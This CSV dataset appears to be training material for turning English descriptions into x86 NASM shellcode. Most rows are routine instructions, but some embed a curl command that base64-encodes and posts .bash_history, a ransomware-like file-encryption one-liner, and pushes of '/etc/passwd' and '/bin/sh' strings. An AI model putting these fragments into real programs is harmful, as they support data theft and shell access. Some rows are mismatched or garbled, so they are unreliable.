move v_src to esi,move var0 var1,"mov esi , v_src","mov var1 , var0"
copy the address of var into esi,copy address var var0,"mov esi , var","mov var0 , var"
move the contents of the ebp register ino the esp register,move contents var0 register var1 esp register,"mov esp , ebp","mov esp , var0"
move the contents of the ebp register into the esp register,move contents var0 register esp register,"mov esp , ebp","mov esp , var0"
move the contents of the esi register into the long starting at the address [esi+18],move the contents of the esi register into the long starting at the address [esi+18],"mov long [esi+18] , esi","mov long [esi+18] , esi"
move the contents of the ebx register into the long starting at the address [esi+22],move the contents of the ebx register into the long starting at the address [esi+22],"mov long [esi+22] , ebx","mov long [esi+22] , ebx"
move the contents of the esi register into the long starting at the address [esi+22],move the contents of the esi register into the long starting at the address [esi+22],"mov long [esi+22] , esi","mov long [esi+22] , esi"
move the contents of the eax register into the long starting at the address [esi+26],move the contents of the eax register into the long starting at the address [esi+26],"mov long [esi+26] , eax","mov long [esi+26] , eax"
move the contents of the ebx register into the long starting at the address [esi+26],move the contents of the ebx register into the long starting at the address [esi+26],"mov long [esi+26] , ebx","mov long [esi+26] , ebx"
move the contents of the eax register into the long starting at the address [esi+30],move the contents of the eax register into the long starting at the address [esi+30],"mov long [esi+30] , eax","mov long [esi+30] , eax"
move eax into sock_reg,move var0 var1,"mov sock_reg , eax","mov var1 , var0"
transfer the value 48 in the memory variable total,transfer value 48 memory variable total,"mov total , 48","mov total , 48"
move the 16-bit integer representation of 2 into the 2 bytes starting at the address in ebx,move var0 integer representation 2 2 bytes starting address var1,"mov word [ebx] , 2","mov word [var1] , 2"
move 0x776f into the word in [esp+0x1],move 0x776f into the word in [esp+0x1],"mov word [esp+0x1] , 0x776f","mov word [esp+0x1] , 0x776f"
move eax to x variable,move var0 x variable,"mov x , eax","mov x , var0"
backup edx into ecx,backup var0 var1,"move ecx , edx","move var1 , var0"
define msg as the byte string 'curl http://localhost:8080 -d 'data='$(cat .bash_history | base64 -w 0) -x post',define msg byte string var0data=var2,"msg db 'curl http : //localhost : 8080 -d 'data='$(cat . bash_history | base64 -w 0) -x post' , 0x0a","msgvar5 var5dbvar5 var5""var5curlvar5 var5http : var5 var5/var5/var5localhost : var5 var58080var5 var5-dvar5 var5""var5data=var5""var5$(var5catvar5 var5 . var5 var5var4var5 var5var5var5 var5var6var5 var50var5)var5 var5-xvar5 var5postvar5""var5 , var5 var50x0a"
declare msg string containing 'hello world!',declare msg string containing var0,"msg db 'hello , world!' , 0xa","msg db 'hello , world!' , 0xa"
define msg variable and initialize with 'i love you!',define msg variable and initialize var0,"msg db 'i love you!' , 0ah","msg db var0 , 0ah"
define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt',define msg byte string var0,"msg db 'mv test . txt . test . txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in . test . txt -out test . txt -pbkdf2 -k - && rm . test . txt' , 0x0a","msg db 'mv test . txt . test . txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in . test . txt -out test . txt -pbkdf2 -k - && rm . test . txt' , 0x0a"
define msg as the byte string 'we found the egg!',define msg byte string var0,"msg db 'we found the egg!' , 0ah , 0dh","msg db var0 , 0ah , 0dh"
define msg_len equal to the length of msg,define var0 equal length msg,msg_len equ $-msg,var0 equ $-msg
declare message string msg1 containing 'hello brave new world!',declare message string var0 containing var1,"msg1 db 'hello , brave new world!' , 0ah","var0 db ""hello , brave new world!"" , 0ah"
define msg2 as the byte string 'passwd',define var0 byte string var1,"msg2 db 'passwd' , 0x00","var0 db var1 , 0x00"
declare message string msg2 containing 'this is how we recycle in nasm',declare message string var0 containing var1,"msg2 db 'this is how we recycle in nasm . ' , 0ah","var0 db ""this is how we recycle in nasm . "" , 0ah"
declare msglength to have the constant value 12,declare var0 have constant value 12,msglength : equ 12,var0 : equ 12
multiply the contents of eax by the 32-bit contents of the memory location tmp,multiply contents var0 var1 contents memory location var2,mul [tmp],mul [var2]
multiply the contents of eax by the 32-bit contents of the memory location value,multiply contents var0 var1 contents memory location value,mul [value],mul [value]
multiply the contents of eax by the 32-bit contents of the memory location var,multiply contents var0 var1 contents memory location var,mul [var],mul [var]
multiply eax by 0x10 and stores the result in edx:eax,multiply var0 var2 and stores result edx:var0,mul 0x10,mul var2
multiply the contents of eax by 25,multiply contents var0 25,mul 25,mul 25
multiply the contents of eax by 3,multiply contents var0 3,mul 3,mul 3
multiply the contents of eax by ebx,multiply contents var0 var1,mul ebx,mul var1
multiply the contents of the eax register by the contents of the ebx register,multiply contents var0 register contents var1 register,mul ebx,mul var1
multiply eax by ebx,multiply var0 var1,mul ebx,mul var1
multiply eax by the contents of the ebx register,multiply var0 contents var1 register,mul ebx,mul var1
mul eax by ebx,var0 var1 var2,mul ebx,var0 var2
mul eax by ecx,var0 var1 var2,mul ecx,var0 var2
multiply eax by the contents of the ecx register,multiply var0 contents var1 register,mul ecx,mul var1
mutliply eax by ecx,var0 var1 var2,mul ecx,mul var2
multiply eax by the contents of the edx register,multiply var0 contents var1 register,mul edx,mul var1
mul eax by edx,var0 var1 var2,mul edx,var0 var2
multiply eax by edx,multiply var0 var1,mul edx,mul var1
allocate 10 words each initialized to 0,allocate 10 words initialized 0,my_table times 10 dw 0,my_table times 10 dw 0
allocate my_table vector of 10 words each initialized to 0,allocate var0 vector 10 words initialized 0,my_table times 10 dw 0,var0 times 10 dw 0
define my_var word variable and initialize it to 0abcdh,define var0 word variable and initialize it 0abcdh,my_var dw 0abcdh,var0 dw 0abcdh
"define myList array of word and initialize it to 1, 2, 3, 4, and 5","define var0 array word and initialize it 1, 2, 3, 4, and 5","myList word 1 , 2 , 3 , 4 , 5","var0 word 1 , 2 , 3 , 4 , 5"
define name as the byte string '/bin/sh',define name byte string var0,"name db '/bin/sh' , 0","name db var0 , 0"
allocate memory for 30 bytes uninitialized name variable,allocate memory var0 30 bytes var1 name variable,name db 30 dup,name db 30 dup
negate eax,negate var0,neg eax,neg var0
negate the contents of eax,negate contents var0,neg eax,neg var0
replaces the contents of the eax register with its two's complement,replaces contents var0 register its two's complement,neg eax,neg var0
replaces the contents of the ebx register with its two's complement,replaces contents var0 register its two's complement,neg ebx,neg var0
replaces the contents of the ecx register with its two's complement,replaces contents var0 register its two's complement,neg ecx,neg var0
negate edi,negate var0,neg edi,neg var0
replaces the contents of the edi register with its two's complement,replaces contents var0 register its two's complement,neg edi,neg var0
replaces the contents of the edx register with its two's complement,replaces contents var0 register its two's complement,neg edx,neg var0
negate the contents of var,negate contents var,neg var,neg var
define the variable neg_number of words and initialize it to -12345,define variable var0 words and initialize it -12345,neg_number dw -12345,var0 dw -12345
define negative label,define negative label,negative :,negative :
declare next_addr function,declare var0 function,next_addr :,var0 :
declare the next_addr label,declare var0 label,next_addr :,var0 :
declare the next_cycle label,declare var0 label,next_cycle :,var0 :
declare next_page function,declare var0 function,next_page :,var0 :
declare the next label,declare next label,next :,next :
do no operation,do no operation,nop,nop
no operation,no operation,nop,nop
negate all the bits of ax register,negate all bits ax register,not ax,not ax
negate all the bits of the ax register,negate all bits ax register,not ax,not ax
negate all bits in the byte at the memory location tmp,negate all bits byte memory location var0,not byte [tmp],not byte [var0]
negate all bits in the byte at the memory location var,negate all bits byte memory location var,not byte [var],not byte [var]
negate all bits in the byte at the memory location var2,negate all bits byte memory location var0,not byte [var2],not byte [var0]
negate all the bits of dl register,negate all bits dl register,not dl,not dl
negate all the bits of the eax register,negate all bits var0 register,not eax,not var0
negate all the bits of ecx register,negate all bits var0 register,not ecx,not var0
negate all the bits of the ecx register,negate all bits var0 register,not ecx,not var0
negate all the bits of the edi register,negate all bits var0 register,not edi,not var0
perform a bit-wise inversion of edx,perform var0 inversion var1,not edx,not var1
negate all the bits of the esi register,negate all bits var0 register,not esi,not var0
define number variable of a word and initialize to 12345,define number variable word and initialize 12345,number dw 12345,number dw 12345
reserve 1 byte for number variable,reserve 1 byte var0 number variable,number : resb 1,number : resb 1
declare an array of six words each initialized with the numbers 34 45 56 67 75 89,declare array six words initialized numbers 34 45 56 67 75 89,"numbers dw 34 , 45 , 56 , 67 , 75 , 89","numbers dw 34 , 45 , 56 , 67 , 75 , 89"
declare the one label,declare one label,one :,one :
declare one label,declare one label,one :,one :
perform or operation between al and bl registers,perform or operation al and var0 registers,"or al , bl","or al , var0"
perform or operation between the al register and syscall_execve,perform or operation al register and var0,"or al , syscall_execve","or al , var0"
perform logical or between the cx register and 0xfff,perform logical or cx register and var0,"or cx , 0xfff","or cx , var0"
perform or operation between dx and 0xfff and save the result into dx,perform or operation var0 and var2 and save result var0,"or dx , 0xfff","or var0 , var2"
perform the or operation between the eax register and 0xffffffff,perform or operation var0 register and var1,"or eax , 0xffffffff","or var0 , var1"
declare the output label,declare output label,output :,output :
define path as the byte string '//bin/sh',define path byte string var0,path db '//bin/sh',path db var0
define the byte string path and initialize it to '//bin/sh',define byte string path and initialize it var0,path db '//bin/sh',path db var0
declare the path label,declare path label,path :,path :
pop the top element of the stack into memory at the four bytes starting at location eax,pop top element stack memory four bytes starting location var0,pop [eax],pop [var0]
pop the top element of the stack into memory at the four bytes starting at location ebx,pop top element stack memory four bytes starting location var0,pop [ebx],pop [var0]
pop the last element pushed onto the stack into ax,pop last element pushed stack ax,pop ax,pop ax
pop the last element pushed onto the stack into bx,pop last element pushed stack var0,pop bx,pop var0
pop the value on the stack back into cx,pop value stack back cx,pop cx,pop cx
restore the top of the stack into the cx register,restore top stack cx register,pop cx,pop cx
pop the value on the stack back into dx,pop value stack back var0,pop dx,pop var0
restore the top of the stack into the dx register,restore top stack var0 register,pop dx,pop var0
pop the value on the stack back into eax,pop value stack back var0,pop eax,pop var0
put syscall value into eax,put syscall value var0,pop eax,pop var0
restore eax from the value we pushed onto the stack at the start,restore var0 value var1 pushed stack start,pop eax,pop var0
restore the original value of eax,restore original value var0,pop eax,pop var0
restore the top of the stack into eax register,restore top stack var0 register,pop eax,pop var0
restore the top of the stack into the eax register,restore top stack var0 register,pop eax,pop var0
pop the top of the stack into the eax register,pop top stack var0 register,pop eax,pop var0
remove last character from the stack into edx,remove last character stack var0,pop eax,pop eax
pop the next argument off the stack into eax,pop next argument off stack var0,pop eax,pop var0
remove last character from the stack into eax,remove last character stack var0,pop eax,pop var0
restore ebp register,restore var0 register,pop ebp,pop var0
restore the top of the stack into the ebp register,restore top stack var0 register,pop ebp,pop var0
restore ebx from the value we pushed onto the stack at the start,restore var0 value var1 pushed stack start,pop ebx,pop var0
restore the original value of ebx,restore original value var0,pop ebx,pop var0
restore the top of the stack into ebx register,restore top stack var0 register,pop ebx,pop var0
restore the top of the stack into the ebx register,restore top stack var0 register,pop ebx,pop var0
remove last character from the stack into ebx,remove last character stack var0,pop ebx,pop var0
pop the value on the stack back into ebx,pop value stack back var0,pop ebx,pop var0
remove last character from the stack into ecx,remove last character stack var0,pop ecx,pop var0
restore ecx from the value we pushed onto the stack at the start,restore var0 value var1 pushed stack start,pop ecx,pop var0
restore ecx register,restore var0 register,pop ecx,pop var0
pop the value on the stack back into ecx,pop value stack back var0,pop ecx,pop var0
restore the top of the stack into the ecx register,restore top stack var0 register,pop ecx,pop var0
restore the top of the stack into the ecx register then decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else make the system call exit,restore top stack var0 register then decrement var0 register and jump var3 label if contents var0 register not zero else make system call exit,"pop ecx \n loop l1 \n mov eax , 1","pop var0 \n loop var3 \n mov eax , 1"
restore the top of the stack into the ecx register then decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else make the system call exit,restore top stack var0 register then decrement var0 register and jump var3 label if contents var0 register not zero else make system call exit,"pop ecx \n loop l2 \n mov eax , 1","pop var0 \n loop var3 \n mov eax , 1"
restore the top of the stack into the ecx register then decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else make the system call exit,restore top stack var0 register then decrement var0 register and jump var3 label if contents var0 register not zero else make system call exit,"pop ecx \n loop l3 \n mov eax , 1","pop var0 \n loop var3 \n mov eax , 1"
pop the top element of the stack into edi,pop top element stack var0,pop edi,pop var0
restore the top of the stack into the edi register,restore top stack var0 register,pop edi,pop var0
restore edx from the value we pushed onto the stack at the start,restore var0 value var1 pushed stack start,pop edx,pop var0
restore the top of the stack into edx register,restore top stack var0 register,pop edx,pop var0
restore the top of the stack into the edx register,restore top stack var0 register,pop edx,pop var0
pop the top of the stack into the edx register,pop top stack var0 register,pop edx,pop var0
restore esi from the value we pushed onto the stack at the start,restore var0 value var1 pushed stack start,pop esi,pop var0
store the shellcode pointer to esi,store shellcode pointer var0,pop esi,pop var0
save the shellcode in the esi register,save shellcode var0 register,pop esi,pop var0
load the shellcode in esi,load shellcode var0,pop esi,pop var0
encoded shellcode in esi,encoded shellcode var0,pop esi,pop var0
save the address of the shellcode in esi,save address shellcode var0,pop esi,pop var0
pop the address of the shellcode in the esi register,pop address shellcode var0 register,pop esi,pop var0
store the pointer to the shellcode into esi,store pointer shellcode var0,pop esi,pop var0
pop the shellcode in esi and save it into dx,pop shellcode var0 and save it var1,"pop esi \n mov dx , [esi]","pop var0 \n mov var1 , [var0]"
restore the top of the stack into the esp register,restore top stack esp register,pop esp,pop esp
restore the top of the stack into the si register,restore top stack si register,pop si,pop si
move doublewords from the stack into the 32 bit registers,move var0 stack 32 bit registers,popad,popad
move doublewords from the stack into the general purpose registers,move var0 stack general purpose registers,popad,popad
pop doublewords from the stack into the general purpose registers,pop var0 stack general purpose registers,popad,popad
"define port array of 5 bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77",define port array 5 bytes and initialize it var0,"port : db 0xd4 , 0x31 , 0xc0 , 0xa8 , 0x3 , 0x77",port : db var0
"define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77",define port array bytes and initialize it var0,"port : db 0xd4 , 0x31 , 0xc0 , 0xa8 , 0x3 , 0x77",port : db var0
declare the prepare label,declare prepare label,prepare :,prepare :
declare the priv_setgid label,declare var0 label,priv_setgid :,var0 :
declare the priv_setuid label,declare var0 label,priv_setuid :,var0 :
declare the process_shellcode label,declare var0 label,process_shellcode :,var0 :
push _ip onto the stack,push var0 stack,push _ip,push var0
push '//pa' onto the stack,push var0 stack,push '//pa',push var0
push '//sh' onto the stack,push var0 stack,push '//sh',push var0
push '/bin' onto the stack,push var0 stack,push '/bin',push var0
push '/etc' onto the stack,push var0 stack,push '/etc',push var0
push 'sswd' onto the stack,push var0 stack,push 'sswd',push var0
push the 4 bytes at address tmp onto stack,push 4 bytes address var0 stack,push [tmp],push [var0]
push the 4 bytes at address var onto the stack,push 4 bytes address var stack,push [var],push [var]
push the 4 bytes at address var2 onto the stack,push 4 bytes address var0 stack,push [var2],push [var0]
push 0bh onto the stack,push var0 stack,push 0bh,push var0
push the value 0x0 to the stack,push value var0 stack,push 0x0,push var0
push 0x0 onto the stack,push var0 stack,push 0x0,push var0
push 0x04020a0a onto the stack,push var0 stack,push 0x04020a0a,push var0
push 0x0a206873 onto the stack,push var0 stack,push 0x0a206873,push var0
push 0x0a3a7964 onto the stack,push var0 stack,push 0x0a3a7964,push var0
push the value 0x0a4c4c41 onto the stack,push value var0 stack,push 0x0a4c4c41,push var0
push 0x0a4c4c41 onto the stack,push var0 stack,push 0x0a4c4c41,push var0
push the value 0x1 onto the stack,push value var0 stack,push 0x1,push var0
push 0x1 to the stack,push var0 stack,push 0x1,push var0
push 0x1 onto the stack,push var0 stack,push 0x1,push var0
push 0x10 onto the stack,push var0 stack,push 0x10,push var0
push 0x10 to the stack,push var0 stack,push 0x10,push var0
push the 0x10 onto the stack,push var0 stack,push 0x10,push var0
push the value 0x10 onto the stack,push value var0 stack,push 0x10,push var0
push the value 0x16 onto the stack,push value var0 stack,push 0x16,push var0
push the value 0x1a onto the stack,push value var0 stack,push 0x1a,push var0
push the value 0x1a to the stack,push value var0 stack,push 0x1a,push var0
push the value 0x1c onto the stack,push value var0 stack,push 0x1c,push var0
push the value 0x1c to the stack,push value var0 stack,push 0x1c,push var0
push 0x2 onto the stack,push var0 stack,push 0x2,push var0
push 0x2 to the stack,push var0 stack,push 0x2,push var0
push the 0x2 onto the stack,push var0 stack,push 0x2,push var0
push the 0x203a4457 onto the stack,push var0 stack,push 0x203a4457,push var0
push 0x203a4457 onto the stack,push var0 stack,push 0x203a4457,push var0
push 0x204c4c41 onto the stack,push var0 stack,push 0x204c4c41,push var0
push the 0x204c4c41 onto the stack,push var0 stack,push 0x204c4c41,push var0
push 0x2431243a onto the stack,push var0 stack,push 0x2431243a,push var0
push the value 0x29 to the stack,push value var0 stack,push 0x29,push var0
push 0x29 onto the stack,push var0 stack,push 0x29,push var0
push 0x2e312e31 onto the stack,push var0 stack,push 0x2e312e31,push var0
push the value 0x2e312e31 to the stack,push value var0 stack,push 0x2e312e31,push var0
push the value 0x2e323931 onto the stack,push value var0 stack,push 0x2e323931,push var0
push 0x2e323931 to the stack,push var0 stack,push 0x2e323931,push var0
push 0x2e373231 to the stack,push var0 stack,push 0x2e373231,push var0
push 0x2e373231 onto the stack,push var0 stack,push 0x2e373231,push var0
push the value 0x2e383631 onto the stack,push value var0 stack,push 0x2e383631,push var0
push 0x2e383631 to the stack,push var0 stack,push 0x2e383631,push var0
push 0x2f2f2f2f onto the stack,push var0 stack,push 0x2f2f2f2f,push var0
push 0x2f2f2f2f to the stack,push var0 stack,push 0x2f2f2f2f,push var0
push the 0x2f2f2f2f onto the stack,push var0 stack,push 0x2f2f2f2f,push var0
push the value 0x2f2f2f2f onto the stack and point eax to the stack register,push value var0 stack and point var1 stack register,"push 0x2f2f2f2f \n mov eax , esp","push var0 \n mov var1 , esp"
push the value 0x2f2f2f2f onto the stack and point ebx to the stack register,push value var0 stack and point var1 stack register,"push 0x2f2f2f2f \n mov ebx , esp","push var0 \n mov var1 , esp"
push the value 0x2f2f2f2f onto the stack and point ecx to the stack register,push value var0 stack and point var1 stack register,"push 0x2f2f2f2f \n mov ecx , esp","push var0 \n mov var1 , esp"
push the value 0x2f2f2f2f onto the stack and point edi to the stack register,push value var0 stack and point var1 stack register,"push 0x2f2f2f2f \n mov edi , esp","push var0 \n mov var1 , esp"
push the value 0x2f2f2f2f onto the stack and point edx to the stack register,push value var0 stack and point var1 stack register,"push 0x2f2f2f2f \n mov edx , esp","push var0 \n mov var1 , esp"
push the value 0x2f2f2f2f onto the stack and point esi to the stack register,push value var0 stack and point var1 stack register,"push 0x2f2f2f2f \n mov esi , esp","push var0 \n mov var1 , esp"
push the 0x2f2f2f6e onto the stack,push var0 stack,push 0x2f2f2f6e,push var0
push 0x2f3a706d onto the stack,push var0 stack,push 0x2f3a706d,push var0
push 0x2f3a746f onto the stack,push var0 stack,push 0x2f3a746f,push var0
push 0x2f656c2d onto the stack,push var0 stack,push 0x2f656c2d,push var0
push the 0x2f656c2d onto the stack,push var0 stack,push 0x2f656c2d,push var0
push 0x2f6e6962 to the stack,push var0 stack,push 0x2f6e6962,push var0
push 0x2f6e6962 onto the stack,push var0 stack,push 0x2f6e6962,push var0
push the value 0x30 onto the stack,push value var0 stack,push 0x30,push var0
push 0x30313a31 to the stack,push var0 stack,push 0x30313a31,push var0
push 0x30313a31 onto the stack,push var0 stack,push 0x30313a31,push var0
push 0x30317974 onto the stack,push var0 stack,push 0x30317974,push var0
push the 0x30317974 onto the stack,push var0 stack,push 0x30317974,push var0
push 0x31313131 onto the stack,push var0 stack,push 0x31313131,push var0
push 0x3131313a onto the stack,push var0 stack,push 0x3131313a,push var0
push 0x31373737 onto the stack,push var0 stack,push 0x31373737,push var0
push the 0x31373737 onto the stack,push var0 stack,push 0x31373737,push var0
push 0x3170762d onto the stack,push var0 stack,push 0x3170762d,push var0
push the value 0x3170762d to the stack,push value var0 stack,push 0x3170762d,push var0
push the 0x3170762d onto the stack,push var0 stack,push 0x3170762d,push var0
push 0x32322e32 onto the stack,push var0 stack,push 0x32322e32,push var0
push 0x32322e32 to the stack,push var0 stack,push 0x32322e32,push var0
push 0x3458652e onto the stack,push var0 stack,push 0x3458652e,push var0
push 0x37373333 to the stack,push var0 stack,push 0x37373333,push var0
push the 0x37373333 onto the stack,push var0 stack,push 0x37373333,push var0
push 0x37373333 onto the stack,push var0 stack,push 0x37373333,push var0
push 0x3a303a3a onto the stack,push var0 stack,push 0x3a303a3a,push var0
push 0x3a30754a onto the stack,push var0 stack,push 0x3a30754a,push var0
push the value 0x3d4c4c41 onto the stack,push value var0 stack,push 0x3d4c4c41,push var0
push 0x3d4c4c41 onto the stack,push var0 stack,push 0x3d4c4c41,push var0
push 0x3e0a7964 onto the stack,push var0 stack,push 0x3e0a7964,push var0
push 0x4 onto the stack,push var0 stack,push 0x4,push var0
push the value 0x4 onto the stack,push value var0 stack,push 0x4,push var0
push 0x45683933 onto the stack,push var0 stack,push 0x45683933,push var0
push 0x46 onto the stack,push var0 stack,push 0x46,push var0
push 0x4c4c4128 onto the stack,push var0 stack,push 0x4c4c4128,push var0
push the value 0x4c4c4128 onto the stack,push value var0 stack,push 0x4c4c4128,push var0
push 0x4c5a304b onto the stack,push var0 stack,push 0x4c5a304b,push var0
push the value 0x4f4e2029 onto the stack,push value var0 stack,push 0x4f4e2029,push var0
push 0x4f4e2029 onto the stack,push var0 stack,push 0x4f4e2029,push var0
push 0x5 onto the stack,push var0 stack,push 0x5,push var0
push the 0x5 onto the stack,push var0 stack,push 0x5,push var0
push 0x50446862 onto the stack,push var0 stack,push 0x50446862,push var0
push the 0x53534150 onto the stack,push var0 stack,push 0x53534150,push var0
push 0x53534150 onto the stack,push var0 stack,push 0x53534150,push var0
push 0x6 onto the stack,push var0 stack,push 0x6,push var0
push the 0x6 value onto the stack,push var0 value stack,push 0x6,push var0
push 0x61622f2f onto the stack,push var0 stack,push 0x61622f2f,push var0
push 0x61622f6e onto the stack,push var0 stack,push 0x61622f6e,push var0
push 0x61655220 onto the stack,push var0 stack,push 0x61655220,push var0
push 0x6168732f onto the stack,push var0 stack,push 0x6168732f,push var0
push 0x6168732f to the stack,push var0 stack,push 0x6168732f,push var0
push the value 0x6168732f onto the stack,push value var0 stack,push 0x6168732f,push var0
push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6168732f \n push 0x6374652f \n mov ebx , esp","push var0 \n push var1 \n mov var2 , esp"
push 0x61702f2f onto the stack,push var0 stack,push 0x61702f2f,push var0
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the eax register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x61702f2f \n push 0x6374652f \n mov eax , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x61702f2f \n push 0x6374652f \n mov ebx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ecx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x61702f2f \n push 0x6374652f \n mov ecx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edi register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x61702f2f \n push 0x6374652f \n mov edi , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x61702f2f \n push 0x6374652f \n mov edx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the esi register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x61702f2f \n push 0x6374652f \n mov esi , esp","push var0 \n push var1 \n mov var2 , esp"
push the 0x61702f63 onto the stack,push var0 stack,push 0x61702f63,push var0
push 0x61702f63 onto the stack,push var0 stack,push 0x61702f63,push var0
push 0x622f7273 onto the stack,push var0 stack,push 0x622f7273,push var0
push 0x622f7273 to the stack,push var0 stack,push 0x622f7273,push var0
push 0x636e2f2f onto the stack,push var0 stack,push 0x636e2f2f,push var0
push 0x636e2f2f to the stack,push var0 stack,push 0x636e2f2f,push var0
push the 0x636e2f2f onto the stack,push var0 stack,push 0x636e2f2f,push var0
push 0x6374652f onto the stack,push var0 stack,push 0x6374652f,push var0
push 0x6374652f to the stack,push var0 stack,push 0x6374652f,push var0
push the 0x6374652f onto the stack,push var0 stack,push 0x6374652f,push var0
push the value 0x6374652f onto the stack and point eax to the stack register,push value var0 stack and point var1 stack register,"push 0x6374652f \n mov eax , esp","push var0 \n mov var1 , esp"
push the value 0x6374652f onto the stack and point ebp to the stack register,push value var0 stack and point var1 stack register,"push 0x6374652f \n mov ebp , esp","push var0 \n mov var1 , esp"
push the value 0x6374652f onto the stack and point ebx to the stack register,push value var0 stack and point var1 stack register,"push 0x6374652f \n mov ebx , esp","push var0 \n mov var1 , esp"
push the value 0x6374652f onto the stack and point ecx to the stack register,push value var0 stack and point var1 stack register,"push 0x6374652f \n mov ecx , esp","push var0 \n mov var1 , esp"
push the value 0x6374652f onto the stack and point edi to the stack register,push value var0 stack and point var1 stack register,"push 0x6374652f \n mov edi , esp","push var0 \n mov var1 , esp"
push the value 0x6374652f onto the stack and point edx to the stack register,push value var0 stack and point var1 stack register,"push 0x6374652f \n mov edx , esp","push var0 \n mov var1 , esp"
push the value 0x6374652f onto the stack and point esi to the stack register,push value var0 stack and point var1 stack register,"push 0x6374652f \n mov esi , esp","push var0 \n mov var1 , esp"
push 0x64687373 onto the stack,push var0 stack,push 0x64687373,push var0
push the value 0x64687373 onto the stack and point the eax register to the stack register,push value var0 stack and point var1 register stack register,"push 0x64687373 \n mov eax , esp","push var0 \n mov var1 , esp"
push the value 0x64687373 onto the stack and point the ebp register to the stack register,push value var0 stack and point var1 register stack register,"push 0x64687373 \n mov ebp , esp","push var0 \n mov var1 , esp"
push the value 0x64687373 onto the stack and point the ebx register to the stack register,push value var0 stack and point var1 register stack register,"push 0x64687373 \n mov ebx , esp","push var0 \n mov var1 , esp"
push the value 0x64687373 onto the stack and point the ecx register to the stack register,push value var0 stack and point var1 register stack register,"push 0x64687373 \n mov ecx , esp","push var0 \n mov var1 , esp"
push the value 0x64687373 onto the stack and point the edi register to the stack register,push value var0 stack and point var1 register stack register,"push 0x64687373 \n mov edi , esp","push var0 \n mov var1 , esp"
push the value 0x64687373 onto the stack and point the edx register to the stack register,push value var0 stack and point var1 register stack register,"push 0x64687373 \n mov edx , esp","push var0 \n mov var1 , esp"
push the value 0x64687373 onto the stack and point the esi register to the stack register,push value var0 stack and point var1 register stack register,"push 0x64687373 \n mov esi , esp","push var0 \n mov var1 , esp"
push 0x6475732f onto the stack,push var0 stack,push 0x6475732f,push var0
push 0x6475732f to the stack,push var0 stack,push 0x6475732f,push var0
push the 0x6475732f onto the stack,push var0 stack,push 0x6475732f,push var0
push the value 0x6475732f and the value 0x6374652f onto the stack and point the eax register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6475732f \n push 0x6374652f \n mov eax , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6475732f and the value 0x6374652f onto the stack and point the ebx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6475732f \n push 0x6374652f \n mov ebx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6475732f and the value 0x6374652f onto the stack and point the ecx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6475732f \n push 0x6374652f \n mov ecx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6475732f and the value 0x6374652f onto the stack and point the edi register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6475732f \n push 0x6374652f \n mov edi , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6475732f and the value 0x6374652f onto the stack and point the edx register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6475732f \n push 0x6374652f \n mov edx , esp","push var0 \n push var1 \n mov var2 , esp"
push the value 0x6475732f and the value 0x6374652f onto the stack and point the esi register to the stack register,push value var0 and value var1 stack and point var2 register stack register,"push 0x6475732f \n push 0x6374652f \n mov esi , esp","push var0 \n push var1 \n mov var2 , esp"
push the 0x64777373 onto the stack,push var0 stack,push 0x64777373,push var0
push 0x64777373 onto the stack,push var0 stack,push 0x64777373,push var0
push 0x6567772f onto the stack,push var0 stack,push 0x6567772f,push var0
push 0x6567772f to the stack,push var0 stack,push 0x6567772f,push var0
push 0x656c6966 onto the stack,push var0 stack,push 0x656c6966,push var0
push the 0x656c6966 onto the stack,push var0 stack,push 0x656c6966,push var0
push 0x65726f43 onto the stack,push var0 stack,push 0x65726f43,push var0
push 0x65782e2f onto the stack,push var0 stack,push 0x65782e2f,push var0
push 0x65782e2f to the stack,push var0 stack,push 0x65782e2f,push var0
push 0x66 onto the stack,push var0 stack,push 0x66,push var0
push 0x66 to the stack,push var0 stack,push 0x66,push var0
push the 0x66 onto the stack,push var0 stack,push 0x66,push var0
push 0x67513231 onto the stack,push var0 stack,push 0x67513231,push var0
push 0x6769666e onto the stack,push var0 stack,push 0x6769666e,push var0
push 0x682f2f2f onto the stack,push var0 stack,push 0x682f2f2f,push var0
push the 0x682f2f2f value onto the stack,push var0 value stack,push 0x682f2f2f,push var0
push //sh to the stack,push //sh stack,push 0x68732f2f,push 0x68732f2f
push ascii sh// onto stack,push ascii var0 stack,push 0x68732f2f,push 0x68732f2f
push hs//,push var0,push 0x68732f2f,push 0x68732f2f
push the 0x68732f2f value onto the stack,push var0 value stack,push 0x68732f2f,push var0
push the value 0x68732f2f onto the stack,push value var0 stack,push 0x68732f2f,push var0
